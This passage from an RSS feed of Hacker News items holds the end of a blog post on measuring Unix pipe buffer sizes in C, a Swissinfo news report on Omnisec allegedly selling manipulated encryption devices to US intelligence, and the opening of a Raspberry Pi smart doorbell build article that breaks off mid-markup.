</span><span>#include</span> <span>&lt;sys/ioctl.h&gt;</span><span>
</span><span></span>
<span>#include</span> <span>&lt;err.h&gt;</span><span>
</span><span>#include</span> <span>&lt;stdio.h&gt;</span><span>
</span><span>#include</span> <span>&lt;stdlib.h&gt;</span><span>
</span><span>#include</span> <span>&lt;unistd.h&gt;</span><span>
</span><span></span>
<span>int</span>
<span>main</span>(<span>int</span> argc, <span>char</span> <span>**</span>argv)
{
	<span>int</span> fildes[<span>2</span>];
	<span>int</span> n;

	<span>if</span> (pipe(fildes) <span>==</span> <span>-</span><span>1</span>)
		err(EXIT_FAILURE, <span>"pipe"</span>);

	<span>if</span> (ioctl(fildes[<span>1</span>], FIONSPACE, <span>&amp;</span>n) <span>==</span> <span>-</span><span>1</span>)
		err(EXIT_FAILURE, <span>"ioctl"</span>);
	printf(<span>"FIONSPACE fildes[1]: %d</span><span>\n</span><span>"</span>, n);

	<span>return</span> EXIT_SUCCESS;
}</code></pre></div>

<p>An alternative approach to check the maximum buffer size of the pipe feature is to count the
bytes writable into it manually, one by one, and to detect the hang.
This can be achieved for example with the <code>alarm(3)</code> call, unblocking the hang.</p>

<div><pre><code data-lang="c"><span>/* CC0 1.0 Universal (CC0 1.0) - Public Domain Dedication */</span>
<span>#include</span> <span>&lt;err.h&gt;</span><span>
</span><span>#include</span> <span>&lt;signal.h&gt;</span><span>
</span><span>#include</span> <span>&lt;stdio.h&gt;</span><span>
</span><span>#include</span> <span>&lt;stdlib.h&gt;</span><span>
</span><span>#include</span> <span>&lt;unistd.h&gt;</span><span>
</span><span></span>
<span>static</span> <span>int</span> n;

<span>static</span> <span>void</span>
<span>sighand</span>(<span>int</span> s)
{

	printf(<span>"bytes written into the pipe: %d</span><span>\n</span><span>"</span>, n);
	exit(EXIT_SUCCESS);
}

<span>int</span>
<span>main</span>(<span>int</span> argc, <span>char</span> <span>**</span>argv)
{
	<span>int</span> fildes[<span>2</span>];

	<span>if</span> (signal(SIGALRM, sighand) <span>==</span> SIG_ERR)
		err(EXIT_FAILURE, <span>"signal"</span>);

	<span>if</span> (pipe(fildes) <span>==</span> <span>-</span><span>1</span>)
		err(EXIT_FAILURE, <span>"pipe"</span>);

	alarm(<span>5</span>); <span>/* arm the alarm to 5 seconds */</span>

	<span>while</span> (write(fildes[<span>1</span>], <span>"x"</span>, <span>1</span>) <span>!=</span> <span>-</span><span>1</span>)
		<span>++</span>n;

	<span>/* if we ended up here, there was an error */</span>
	err(EXIT_FAILURE, <span>"write"</span>);
}</code></pre></div>

<p>Alternatively, one could set the pipe end in the non-blocking mode.
This can be achieved with
the <code>fcntl(2)</code> call and the <code>F_SETFL</code> + <code>O_NONBLOCK</code> arguments.</p>

<p>The <code>O_NONBLOCK</code> mode on pipes causes the following change:</p>

<ul>
<li>Writing into a full pipe buffer returns with <code>-1</code> and errno <code>EAGAIN</code>, instead of blocking.</li>
</ul>

<div><pre><code data-lang="c"><span>/* CC0 1.0 Universal (CC0 1.0) - Public Domain Dedication */</span>
<span>#include</span> <span>&lt;err.h&gt;</span><span>
</span><span>#include</span> <span>&lt;errno.h&gt;</span><span>
</span><span>#include</span> <span>&lt;fcntl.h&gt;</span><span>
</span><span>#include</span> <span>&lt;limits.h&gt;</span><span>
</span><span>#include</span> <span>&lt;stdio.h&gt;</span><span>
</span><span>#include</span> <span>&lt;stdlib.h&gt;</span><span>
</span><span>#include</span> <span>&lt;unistd.h&gt;</span><span>
</span><span></span>
<span>int</span>
<span>main</span>(<span>int</span> argc, <span>char</span> <span>**</span>argv)
{
	<span>int</span> fildes[<span>2</span>];
	<span>int</span> n;

	<span>if</span> (pipe(fildes) <span>==</span> <span>-</span><span>1</span>)
		err(EXIT_FAILURE, <span>"pipe"</span>);

	<span>if</span> (fcntl(fildes[<span>1</span>], F_SETFL, O_NONBLOCK) <span>==</span> <span>-</span><span>1</span>)
		err(EXIT_FAILURE, <span>"fcntl"</span>);

	<span>while</span> (write(fildes[<span>1</span>], <span>"x"</span>, <span>1</span>) <span>!=</span> <span>-</span><span>1</span>)
		<span>++</span>n;

	<span>/* filter real errors from the unavailable for now resource */</span>
	<span>if</span> (errno <span>!=</span> EAGAIN)
		err(EXIT_FAILURE, <span>"write"</span>);

	printf(<span>"bytes written into the pipe: %d</span><span>\n</span><span>"</span>, n);

	<span>return</span> EXIT_SUCCESS;
}</code></pre></div>

<p>There are a few other kernel specific approaches to guess the maximum buffer size
that can be stored inside the kernel. One of them is to read <code>PIPE_SIZE</code> from <code>&lt;sys/pipe.h&gt;</code>
on BSD systems, but given that it is 16384 for FreeBSD, NetBSD and OpenBSD, it’s merely an
internal implementation specific header.</p>

<p>In order to make the picture fuller, we need to mention that the FreeBSD and NetBSD kernels
allow tuning of the pipe behavior and investigating
the kernel virtual address spent on the buffers.</p>

<p>FreeBSD provides the following <code>sysctl</code> knobs:</p>

<ul>
<li><code>kern.ipc.piperesizeallowed</code>: Pipe resizing allowed</li>
<li><code>kern.ipc.piperesizefail</code>: Pipe resize failures</li>
<li><code>kern.ipc.pipeallocfail</code>: Pipe allocation failures</li>
<li><code>kern.ipc.pipefragretry</code>: Pipe allocation retries due to fragmentation</li>
<li><code>kern.ipc.pipekva</code>: Pipe KVA usage</li>
<li><code>kern.ipc.maxpipekva</code>: Pipe KVA limit</li>
</ul>

<p>NetBSD:</p>

<ul>
<li><code>kern.pipe.maxbigpipes</code>: Maximum number of “big” pipes</li>
<li><code>kern.pipe.nbigpipes</code>: Number of “big” pipes</li>
<li><code>kern.pipe.kvasize</code>: Amount of kernel memory consumed by pipe buffers</li>
</ul>

<p>OpenBSD does not provide any similar <code>sysctl</code> functionality for pipes.</p>

<p>What are “big” pipes in NetBSD? They are special case pipes that exceed <code>PIPE_SIZE</code> …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.moritz.systems/blog/mastering-unix-pipes-part-1/">https://www.moritz.systems/blog/mastering-unix-pipes-part-1/</a></em></p>]]>
            </description>
            <link>https://www.moritz.systems/blog/mastering-unix-pipes-part-1/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25226163</guid>
            <pubDate>Fri, 27 Nov 2020 06:59:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Second Swiss firm allegedly sold encrypted spying devices]]>
            </title>
            <description>
<![CDATA[
Score 18 | Comments 8 (<a href="https://news.ycombinator.com/item?id=25226136">thread link</a>) | @JoachimS
<br/>
November 26, 2020 | https://www.swissinfo.ch/eng/latest-news/second-swiss-firm-allegedly-sold-encrypted-spying-devices/46186432 | <a href="https://web.archive.org/web/*/https://www.swissinfo.ch/eng/latest-news/second-swiss-firm-allegedly-sold-encrypted-spying-devices/46186432">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<section>
<div>
<div>
<figure>
<picture>
<source srcset="https://www.swissinfo.ch/resource/image/46186430/landscape_ratio3x2/880/587/a683e845a8c9bdb270a5b635dfc947ed/gO/omnisec.jpg" media="(min-width: 900px)">
<source srcset="https://www.swissinfo.ch/resource/image/46186430/landscape_ratio3x2/580/387/a683e845a8c9bdb270a5b635dfc947ed/Gx/omnisec.jpg" media="(min-width: 321px)">

</picture>
<figcaption>
Omnisec is the second Swiss company that allegedly sold manipulated encryption devices to US intelligence services. <span>Keystone / Walter Bieri</span>
</figcaption> </figure>
</div>
</div><p>Swiss public television, SRF, has found a second company besides Crypto AG&nbsp;was involved in manufacturing manipulated devices allegedly used for spying by foreign intelligence.</p>
<span>This content was published on November 26, 2020 - 11:34</span>
<time datetime="2020-11-26T11:34:28+01:00">

</time><p>According to <a rel="noopener" target="_blank" href="https://www.srf.ch/news/schweiz/verschluesselungsgeraete-geheimdienstaffaere-weitere-schweizer-firma-rueckt-in-den-fokus">SRF sources</a>, the Swiss company Omnisec AG had ties to US intelligence services. This follows revelations in February by SRF, German television ZDF and <em>The Washington Post</em> that Zug-based firm Crypto AG was at the heart of a huge international spying operation led by the CIA, and to a lesser extent by the German BND spy agency.&nbsp;Omnisec was one of the largest competitors of Crypto AG.</p><p>Swiss cryptologist and professor Ueli Maurer was a consultant for Omnisec for years and told SRF that in 1989 US intelligence services (National Security Agency) contacted Omnisec through him.</p><p>Of concern are the OC-500 series devices. Devices were sold to several Swiss federal agencies. However, Swiss&nbsp;authorities only noticed the devices weren't secure&nbsp;in the mid-2000s.</p><p>Several Swiss companies also received manipulated devices from Omnisec, including Switzerland’s largest bank, UBS. It is unclear whether the authorities informed UBS about the weak devices in the mid-2000s. UBS told SRF that it does not comment on security matters but that it had no indications that sensitive data were exposed at the time.</p>
<p>Omnisec, founded in 1987, manufactured voice, fax and data encryption equipment. It was dissolved a few years ago. The most recent head of the company, Clemens Kammer, told SRF that Omnisec customers “have and will continue to place great value on security, confidentiality, discretion and reliability in business relationships”.</p><p>Some politicians have called for further investigations into these latest allegations that may reveal who, if anyone, in the federal government knew of Omnisec’s business affairs with foreign intelligence.</p><h2>Crypto affair</h2><p>Earlier this month, a nine-month&nbsp;<a rel="noopener" target="_blank" href="https://web.archive.org/web/20201110183555/https:/www.parlament.ch/press-releases/Pages/mm-gpdel-2020-11-10.aspx">investigation</a>&nbsp;by the Swiss parliamentary audit committee (GPDel), found that the Swiss intelligence service knew that the US Central Intelligence Agency was behind the Swiss-based Crypto AG as far back as 1993. The report says that Swiss intelligence later collaborated with them to gather information from foreign sources.&nbsp;</p><p>More than 100 countries bought encryption devices from the Zug-based company, which did business under the guise of Swiss neutrality. In reality, the firm belonged to the CIA and Germany intelligence service, which could freely read what it encrypted. Information intercepted with the help of Crypto’s devices changed the course of events, including the Iran hostage crisis of 1979.</p> </section>
</div></div>]]>
            </description>
            <link>https://www.swissinfo.ch/eng/latest-news/second-swiss-firm-allegedly-sold-encrypted-spying-devices/46186432</link>
            <guid isPermaLink="false">hacker-news-small-sites-25226136</guid>
            <pubDate>Fri, 27 Nov 2020 06:54:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[DIY Smart Doorbell with a Raspberry Pi]]>
            </title>
            <description>
<![CDATA[
Score 168 | Comments 77 (<a href="https://news.ycombinator.com/item?id=25225934">thread link</a>) | @bdcravens
<br/>
November 26, 2020 | https://www.technicallywizardry.com/diy-smart-doorbell-raspberry-pi/ | <a href="https://web.archive.org/web/*/https://www.technicallywizardry.com/diy-smart-doorbell-raspberry-pi/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-9354"><div><p>A DIY smart doorbell with a built-in <strong>camera</strong>, <strong>microphone</strong>, and <strong>speaker</strong>. This steampunk-themed design integrates with home assistant and our <a href="https://www.technicallywizardry.com/cabin/diy-multi-room-sound-system/" data-wpel-link="internal" rel="internal follow noopener noreferrer">multi-room audio system</a> to communicate with the rest of our <a href="https://www.technicallywizardry.com/cabin/" data-wpel-link="internal" rel="internal follow noopener noreferrer">DIY smart home</a>.</p><p>Rather than buying a Ring Doorbell (<em>or Nest, or one of the other competitors</em>) I built our own smart doorbell with a Raspberry Pi. The whole project cost about $150 (USD), which is about average for a smart doorbell, but it is much more full-featured than anything else you’ll find on the market. For example, it integrates with the rest of the home security system — using machine learning to identify humans, cars, animals, and more:</p><figure><picture><source srcset="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" sizes="(max-width: 1024px) 100vw, 1024px" type="image/webp" data-srcset="https://content.technicallywizardry.com/2020/05/17145125/936F84BB-EC48-4F64-975B-8BC87C2E7EE2.jpg.webp 2048w, https://content.technicallywizardry.com/2020/05/17145125/936F84BB-EC48-4F64-975B-8BC87C2E7EE2-300x300.jpg.webp 300w, https://content.technicallywizardry.com/2020/05/17145125/936F84BB-EC48-4F64-975B-8BC87C2E7EE2-1024x1024.jpg.webp 1024w, https://content.technicallywizardry.com/2020/05/17145125/936F84BB-EC48-4F64-975B-8BC87C2E7EE2-150x150.jpg.webp 150w, https://content.technicallywizardry.com/2020/05/17145125/936F84BB-EC48-4F64-975B-8BC87C2E7EE2-768x768.jpg.webp 768w, https://content.technicallywizardry.com/2020/05/17145125/936F84BB-EC48-4F64-975B-8BC87C2E7EE2-1536x1536.jpg.webp 1536w, https://content.technicallywizardry.com/2020/05/17145125/936F84BB-EC48-4F64-975B-8BC87C2E7EE2-214x214.jpg.webp 214w, https://content.technicallywizardry.com/2020/05/17145125/936F84BB-EC48-4F64-975B-8BC87C2E7EE2-540x540.jpg.webp 540w, https://content.technicallywizardry.com/2020/05/17145125/936F84BB-EC48-4F64-975B-8BC87C2E7EE2-344x344.jpg.webp 344w, https://content.technicallywizardry.com/2020/05/17145125/936F84BB-EC48-4F64-975B-8BC87C2E7EE2-442x442.jpg.webp 442w"><img src="https://content.technicallywizardry.com/2020/05/17145125/936F84BB-EC48-4F64-975B-8BC87C2E7EE2.jpg" alt="DIY smart doorbell detects a guest visitor with AI computer vision" width="1024" height="1024" title="Detecting a person approaching" srcset="https://content.technicallywizardry.com/2020/05/17145125/936F84BB-EC48-4F64-975B-8BC87C2E7EE2.jpg 2048w, https://content.technicallywizardry.com/2020/05/17145125/936F84BB-EC48-4F64-975B-8BC87C2E7EE2-300x300.jpg 300w, https://content.technicallywizardry.com/2020/05/17145125/936F84BB-EC48-4F64-975B-8BC87C2E7EE2-1024x1024.jpg 1024w, https://content.technicallywizardry.com/2020/05/17145125/936F84BB-EC48-4F64-975B-8BC87C2E7EE2-150x150.jpg 150w, https://content.technicallywizardry.com/2020/05/17145125/936F84BB-EC48-4F64-975B-8BC87C2E7EE2-768x768.jpg 768w, https://content.technicallywizardry.com/2020/05/17145125/936F84BB-EC48-4F64-975B-8BC87C2E7EE2-1536x1536.jpg 1536w, https://content.technicallywizardry.com/2020/05/17145125/936F84BB-EC48-4F64-975B-8BC87C2E7EE2-214x214.jpg 214w, https://content.technicallywizardry.com/2020/05/17145125/936F84BB-EC48-4F64-975B-8BC87C2E7EE2-540x540.jpg 540w, https://content.technicallywizardry.com/2020/05/17145125/936F84BB-EC48-4F64-975B-8BC87C2E7EE2-344x344.jpg 344w, https://content.technicallywizardry.com/2020/05/17145125/936F84BB-EC48-4F64-975B-8BC87C2E7EE2-442x442.jpg 442w" sizes="(max-width: 1024px) 100vw, 1024px" data-eio="l" data-src="https://content.technicallywizardry.com/2020/05/17145125/936F84BB-EC48-4F64-975B-8BC87C2E7EE2.jpg" data-old-src="https://assets.technicallywizardry.com/wp-content/ewww/lazy/placeholder-1024x1024.png" data-srcset="https://content.technicallywizardry.com/2020/05/17145125/936F84BB-EC48-4F64-975B-8BC87C2E7EE2.jpg 2048w, https://content.technicallywizardry.com/2020/05/17145125/936F84BB-EC48-4F64-975B-8BC87C2E7EE2-300x300.jpg 300w, https://content.technicallywizardry.com/2020/05/17145125/936F84BB-EC48-4F64-975B-8BC87C2E7EE2-1024x1024.jpg 1024w, https://content.technicallywizardry.com/2020/05/17145125/936F84BB-EC48-4F64-975B-8BC87C2E7EE2-150x150.jpg 150w, https://content.technicallywizardry.com/2020/05/17145125/936F84BB-EC48-4F64-975B-8BC87C2E7EE2-768x768.jpg 768w, https://content.technicallywizardry.com/2020/05/17145125/936F84BB-EC48-4F64-975B-8BC87C2E7EE2-1536x1536.jpg 1536w, https://content.technicallywizardry.com/2020/05/17145125/936F84BB-EC48-4F64-975B-8BC87C2E7EE2-214x214.jpg 214w, https://content.technicallywizardry.com/2020/05/17145125/936F84BB-EC48-4F64-975B-8BC87C2E7EE2-540x540.jpg 540w, https://content.technicallywizardry.com/2020/05/17145125/936F84BB-EC48-4F64-975B-8BC87C2E7EE2-344x344.jpg 344w, https://content.technicallywizardry.com/2020/05/17145125/936F84BB-EC48-4F64-975B-8BC87C2E7EE2-442x442.jpg 442w"></picture><figcaption>The smart doorbell uses TensorFlow to detect people, cars, animals, and more.</figcaption></figure><p>But I’m getting ahead of myself.</p><h2><span id="Designing_the_Smart_Doorbell"></span>Designing the Smart Doorbell<span></span></h2><p>Doorbells live outside.</p><p>Okay, that’s obvious. But it was my first electronic project that needed to <em>survive the elements</em>. To that end, I decided to use a <strong>junction box</strong> to house the electronics themselves.</p><p>The next requirement was also obvious: a <strong>button</strong>. However, the concern with such a unique design is that visitors need to intuitively understand <em>what the device is</em>. I decided upon a durable metal button that also lights up. The intention is for the light of the ring to make the button obvious.</p><p>Finally, the camera &amp; speakers. This is arguably the most important security camera in the entire house, and I didn’t have a lot of space in the junction box, so I splurged on a <strong>night-vision IR camera</strong> with a microphone built-in. Throw in a tiny USB speaker, and we have <strong>bi-directional audio</strong>.</p><p>The complete part list:</p><article><div><a href="https://www.technicallywizardry.com/speaker-multi-room-wireless-receiver/" title="Related: Turn Any Speaker into a Multi-Room Wireless Receiver" data-wpel-link="internal" rel="internal follow noopener noreferrer"><picture><source srcset="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" sizes="(max-width: 736px) 100vw, 736px" type="image/webp" data-srcset="https://content.technicallywizardry.com/2020/04/28164600/music-speakers-cover-1-1024x576.jpg.webp 1024w, https://content.technicallywizardry.com/2020/04/28164600/music-speakers-cover-1-300x169.jpg.webp 300w, https://content.technicallywizardry.com/2020/04/28164600/music-speakers-cover-1-768x432.jpg.webp 768w, https://content.technicallywizardry.com/2020/04/28164600/music-speakers-cover-1-1536x864.jpg.webp 1536w, https://content.technicallywizardry.com/2020/04/28164600/music-speakers-cover-1-540x304.jpg.webp 540w, https://content.technicallywizardry.com/2020/04/28164600/music-speakers-cover-1-344x194.jpg.webp 344w, https://content.technicallywizardry.com/2020/04/28164600/music-speakers-cover-1-1128x635.jpg.webp 1128w, https://content.technicallywizardry.com/2020/04/28164600/music-speakers-cover-1.jpg.webp 1920w"><img width="736" height="414" src="https://content.technicallywizardry.com/2020/04/28164600/music-speakers-cover-1-1024x576.jpg" alt="multi-room audio speakers snapcast" srcset="https://content.technicallywizardry.com/2020/04/28164600/music-speakers-cover-1-1024x576.jpg 1024w, https://content.technicallywizardry.com/2020/04/28164600/music-speakers-cover-1-300x169.jpg 300w, https://content.technicallywizardry.com/2020/04/28164600/music-speakers-cover-1-768x432.jpg 768w, https://content.technicallywizardry.com/2020/04/28164600/music-speakers-cover-1-1536x864.jpg 1536w, https://content.technicallywizardry.com/2020/04/28164600/music-speakers-cover-1-540x304.jpg 540w, https://content.technicallywizardry.com/2020/04/28164600/music-speakers-cover-1-344x194.jpg 344w, https://content.technicallywizardry.com/2020/04/28164600/music-speakers-cover-1-1128x635.jpg 1128w, https://content.technicallywizardry.com/2020/04/28164600/music-speakers-cover-1.jpg 1920w" sizes="(max-width: 736px) 100vw, 736px" data-eio="l" data-src="https://content.technicallywizardry.com/2020/04/28164600/music-speakers-cover-1-1024x576.jpg" data-old-src="https://assets.technicallywizardry.com/wp-content/ewww/lazy/placeholder-1024x576.png" data-srcset="https://content.technicallywizardry.com/2020/04/28164600/music-speakers-cover-1-1024x576.jpg 1024w, https://content.technicallywizardry.com/2020/04/28164600/music-speakers-cover-1-300x169.jpg 300w, https://content.technicallywizardry.com/2020/04/28164600/music-speakers-cover-1-768x432.jpg 768w, https://content.technicallywizardry.com/2020/04/28164600/music-speakers-cover-1-1536x864.jpg 1536w, https://content.technicallywizardry.com/2020/04/28164600/music-speakers-cover-1-540x304.jpg 540w, https://content.technicallywizardry.com/2020/04/28164600/music-speakers-cover-1-344x194.jpg 344w, https://content.technicallywizardry.com/2020/04/28164600/music-speakers-cover-1-1128x635.jpg 1128w, https://content.technicallywizardry.com/2020/04/28164600/music-speakers-cover-1.jpg 1920w"></picture></a></div><div><div><div><a href="https://www.technicallywizardry.com/speaker-multi-room-wireless-receiver/" title="Related: Turn Any Speaker into a Multi-Room Wireless Receiver" data-wpel-link="internal" rel="internal follow noopener noreferrer"><picture><source srcset="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" sizes="(max-width: 300px) 100vw, 300px" type="image/webp" data-srcset="https://content.technicallywizardry.com/2020/01/22001321/pipes-cta-300x103.png.webp 300w, https://content.technicallywizardry.com/2020/01/22001321/pipes-cta.png.webp 482w"><img width="300" height="103" src="https://content.technicallywizardry.com/2020/01/22001321/pipes-cta-300x103.png" alt="" srcset="https://content.technicallywizardry.com/2020/01/22001321/pipes-cta-300x103.png 300w, https://content.technicallywizardry.com/2020/01/22001321/pipes-cta.png 482w" sizes="(max-width: 300px) 100vw, 300px" data-eio="l" data-src="https://content.technicallywizardry.com/2020/01/22001321/pipes-cta-300x103.png" data-old-src="https://assets.technicallywizardry.com/wp-content/ewww/lazy/placeholder-300x103.png" data-srcset="https://content.technicallywizardry.com/2020/01/22001321/pipes-cta-300x103.png 300w, https://content.technicallywizardry.com/2020/01/22001321/pipes-cta.png 482w"></picture></a></div><div><div><p>Building a multi-room home audio system begins by making "dumb speakers smart." Like with Sonos, these DIY wireless receiver(s) can be grouped together and play music from many different sources using pulse audio + snapcast.</p></div></div></div></div></article><h2><span id="Building_the_Doorbell"></span>Building the Doorbell<span></span></h2><p>I had some spare copper and brass parts lying around from <a href="https://www.technicallywizardry.com/magic/" data-wpel-link="internal" rel="internal follow noopener noreferrer">prior steampunk projects</a>. This came in handy when not all of the electronics could easily fit in the junction box.</p><p>I began by laying out the parts. Three holes were drilled in the sides of the junction box for the power cable, USB cables, and button wires. Plus, one larger hole in the cover to accommodate the camera:</p><figure><picture><source srcset="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" sizes="(max-width: 719px) 100vw, 719px" type="image/webp" data-srcset="https://content.technicallywizardry.com/2020/05/17142818/assembled-scaled-e1591796283806-959x1024.jpg.webp 959w, https://content.technicallywizardry.com/2020/05/17142818/assembled-scaled-e1591796283806-281x300.jpg.webp 281w, https://content.technicallywizardry.com/2020/05/17142818/assembled-scaled-e1591796283806-768x820.jpg.webp 768w, https://content.technicallywizardry.com/2020/05/17142818/assembled-scaled-e1591796283806-1439x1536.jpg.webp 1439w, https://content.technicallywizardry.com/2020/05/17142818/assembled-scaled-e1591796283806.jpg.webp 1918w"><img src="https://content.technicallywizardry.com/2020/05/17142818/assembled-scaled-e1591796283806-959x1024.jpg" alt="assembling the raspberry pi parts to create a smart doorbell" width="719" height="768" title="Smart doorbell parts" srcset="https://content.technicallywizardry.com/2020/05/17142818/assembled-scaled-e1591796283806-959x1024.jpg 959w, https://content.technicallywizardry.com/2020/05/17142818/assembled-scaled-e1591796283806-281x300.jpg 281w, https://content.technicallywizardry.com/2020/05/17142818/assembled-scaled-e1591796283806-768x820.jpg 768w, https://content.technicallywizardry.com/2020/05/17142818/assembled-scaled-e1591796283806-1439x1536.jpg 1439w, https://content.technicallywizardry.com/2020/05/17142818/assembled-scaled-e1591796283806.jpg 1918w" sizes="(max-width: 719px) 100vw, 719px" data-eio="l" data-src="https://content.technicallywizardry.com/2020/05/17142818/assembled-scaled-e1591796283806-959x1024.jpg" data-old-src="https://assets.technicallywizardry.com/wp-content/ewww/lazy/placeholder-959x1024.png" data-srcset="https://content.technicallywizardry.com/2020/05/17142818/assembled-scaled-e1591796283806-959x1024.jpg 959w, https://content.technicallywizardry.com/2020/05/17142818/assembled-scaled-e1591796283806-281x300.jpg 281w, https://content.technicallywizardry.com/2020/05/17142818/assembled-scaled-e1591796283806-768x820.jpg 768w, https://content.technicallywizardry.com/2020/05/17142818/assembled-scaled-e1591796283806-1439x1536.jpg 1439w, https://content.technicallywizardry.com/2020/05/17142818/assembled-scaled-e1591796283806.jpg 1918w"></picture><figcaption>The raspberry pi inside the junction box, with holes drilled in the sides for cables.</figcaption></figure><p>Before sealing the parts, though, it was time to prototype the doorbell itself.</p><h2><span id="Ringing_the_Doorbell"></span>Ringing the Doorbell<span></span></h2><p>The first order of business was to make the doorbell actually ring.</p><p>With the doorbell wire attached to GPIO18 (pin 12) on the Raspberry Pi, I then used the <strong>Serial Port</strong> input in <a href="https://www.technicallywizardry.com/node-red-docker-kubernetes/" data-wpel-link="internal" rel="internal follow noopener noreferrer">Node RED</a> to detect button-presses. To actually trigger a doorbell alert, as well as handle bi-directional (microphone/intercom) audio, see this post:</p><article><div><a href="https://www.technicallywizardry.com/loudspeaker-network-intercoms-alerts/" title="Related: Loudspeaker Network &amp; Audio Alerts with Home Assistant" data-wpel-link="internal" rel="internal follow noopener noreferrer"><picture><source srcset="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" sizes="(max-width: 736px) 100vw, 736px" type="image/webp" data-srcset="https://content.technicallywizardry.com/2020/05/17150705/node-red-doorbell-cover-1024x576.jpg.webp 1024w, https://content.technicallywizardry.com/2020/05/17150705/node-red-doorbell-cover-300x169.jpg.webp 300w, https://content.technicallywizardry.com/2020/05/17150705/node-red-doorbell-cover-768x432.jpg.webp 768w, https://content.technicallywizardry.com/2020/05/17150705/node-red-doorbell-cover-1536x864.jpg.webp 1536w, https://content.technicallywizardry.com/2020/05/17150705/node-red-doorbell-cover-540x304.jpg.webp 540w, https://content.technicallywizardry.com/2020/05/17150705/node-red-doorbell-cover-344x194.jpg.webp 344w, https://content.technicallywizardry.com/2020/05/17150705/node-red-doorbell-cover-1128x635.jpg.webp 1128w, https://content.technicallywizardry.com/2020/05/17150705/node-red-doorbell-cover.jpg.webp 1920w"><img width="736" height="414" src="https://content.technicallywizardry.com/2020/05/17150705/node-red-doorbell-cover-1024x576.jpg" alt="the doorbell broadcasts to the loudspeaker network via node red" srcset="https://content.technicallywizardry.com/2020/05/17150705/node-red-doorbell-cover-1024x576.jpg 1024w, https://content.technicallywizardry.com/2020/05/17150705/node-red-doorbell-cover-300x169.jpg 300w, https://content.technicallywizardry.com/2020/05/17150705/node-red-doorbell-cover-768x432.jpg 768w, https://content.technicallywizardry.com/2020/05/17150705/node-red-doorbell-cover-1536x864.jpg 1536w, https://content.technicallywizardry.com/2020/05/17150705/node-red-doorbell-cover-540x304.jpg 540w, https://content.technicallywizardry.com/2020/05/17150705/node-red-doorbell-cover-344x194.jpg 344w, https://content.technicallywizardry.com/2020/05/17150705/node-red-doorbell-cover-1128x635.jpg 1128w, https://content.technicallywizardry.com/2020/05/17150705/node-red-doorbell-cover.jpg 1920w" sizes="(max-width: 736px) 100vw, 736px" data-eio="l" data-src="https://content.technicallywizardry.com/2020/05/17150705/node-red-doorbell-cover-1024x576.jpg" data-old-src="https://assets.technicallywizardry.com/wp-content/ewww/lazy/placeholder-1024x576.png" data-srcset="https://content.technicallywizardry.com/2020/05/17150705/node-red-doorbell-cover-1024x576.jpg 1024w, https://content.technicallywizardry.com/2020/05/17150705/node-red-doorbell-cover-300x169.jpg 300w, https://content.technicallywizardry.com/2020/05/17150705/node-red-doorbell-cover-768x432.jpg 768w, https://content.technicallywizardry.com/2020/05/17150705/node-red-doorbell-cover-1536x864.jpg 1536w, https://content.technicallywizardry.com/2020/05/17150705/node-red-doorbell-cover-540x304.jpg 540w, https://content.technicallywizardry.com/2020/05/17150705/node-red-doorbell-cover-344x194.jpg 344w, https://content.technicallywizardry.com/2020/05/17150705/node-red-doorbell-cover-1128x635.jpg 1128w, https://content.technicallywizardry.com/2020/05/17150705/node-red-doorbell-cover.jpg 1920w"></picture></a></div><div><div><div><a href="https://www.technicallywizardry.com/loudspeaker-network-intercoms-alerts/" title="Related: Loudspeaker Network &amp; Audio Alerts with Home Assistant" data-wpel-link="internal" rel="internal follow noopener noreferrer"><picture><source srcset="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" sizes="(max-width: 300px) 100vw, 300px" type="image/webp" data-srcset="https://content.technicallywizardry.com/2020/01/22001321/pipes-cta-300x103.png.webp 300w, https://content.technicallywizardry.com/2020/01/22001321/pipes-cta.png.webp 482w"><img width="300" height="103" src="https://content.technicallywizardry.com/2020/01/22001321/pipes-cta-300x103.png" alt="" srcset="https://content.technicallywizardry.com/2020/01/22001321/pipes-cta-300x103.png 300w, https://content.technicallywizardry.com/2020/01/22001321/pipes-cta.png 482w" sizes="(max-width: 300px) 100vw, 300px" data-eio="l" data-src="https://content.technicallywizardry.com/2020/01/22001321/pipes-cta-300x103.png" data-old-src="https://assets.technicallywizardry.com/wp-content/ewww/lazy/placeholder-300x103.png" data-srcset="https://content.technicallywizardry.com/2020/01/22001321/pipes-cta-300x103.png 300w, https://content.technicallywizardry.com/2020/01/22001321/pipes-cta.png 482w"></picture></a></div><div><div><p>Aside from playing music, a multi-room audio system is also capable of becoming a loudspeaker network. Using Home Assistant, it's easy to broadcast audio alerts to the entire household.</p></div></div></div></div></article><h2><span id="Motion_Sensor_Doorbell_Camera"></span>Motion Sensor Doorbell Camera<span></span></h2><p>There’s also the topic of motion detection and video.</p><p>In this regard, the doorbell is just another CCTV camera. It uses the exact same setup described in the following series of posts. The motion detection and object recognition is what generates the images like the one at the top of this post.</p><article><div><a href="https://www.technicallywizardry.com/iot/cctv-security-cameras/" title="Related: CCTV Security Cameras" data-wpel-link="internal" rel="internal follow noopener noreferrer"><picture><source srcset="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" sizes="(max-width: 736px) 100vw, 736px" type="image/webp" data-srcset="https://content.technicallywizardry.com/2020/07/04145741/cctv-cover-1024x576.jpg.webp 1024w, https://content.technicallywizardry.com/2020/07/04145741/cctv-cover-300x169.jpg.webp 300w, https://content.technicallywizardry.com/2020/07/04145741/cctv-cover-768x432.jpg.webp 768w, https://content.technicallywizardry.com/2020/07/04145741/cctv-cover-1536x864.jpg.webp 1536w, 